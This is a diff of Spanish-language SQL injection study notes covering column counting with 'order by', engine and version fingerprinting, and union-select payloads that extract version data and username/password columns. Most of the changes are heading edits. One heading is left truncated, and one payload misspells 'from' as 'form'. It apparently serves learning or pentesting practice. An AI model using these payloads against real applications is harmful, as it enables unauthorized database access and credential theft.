@@ -1,4 +1,4 @@
-## Identificación de versión y motor de base de datos
+# Identificación de versión y motor de base de datos
 #### Oracle
 Identificar el numero de columnas
 `' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
@@ -20,7 +20,7 @@ Una vez ya hemos identificado las columnas debemos probar con un
 Para extraer la versión
 `' union select 1,@@version-- -`, nos devolverá toda la información de la base de datos
 
-## Listar numero de columnas de una tabla
+# Listar numero de columnas de una tabla
 
 #### Identificando cadenas nulas
 Identificar el numero de columnas
@@ -59,9 +59,11 @@ Ver datos de las columnas de la tabla seleccionada
 `' union select username,password form 'nombretabla'.'nombrecolumna'-- -`
 
 
-## Listar contenido de las bases de datos
+### Listar multiples valores e
 
-#### Oracle
+# Listar contenido de las bases de datos
+
+### Oracle
 Identificar el numero de columnas
 `' order by 5-- -`, debemos de ir cambiando el número hasta que veamos que cambia algo y ya no nos devuelve un error
 
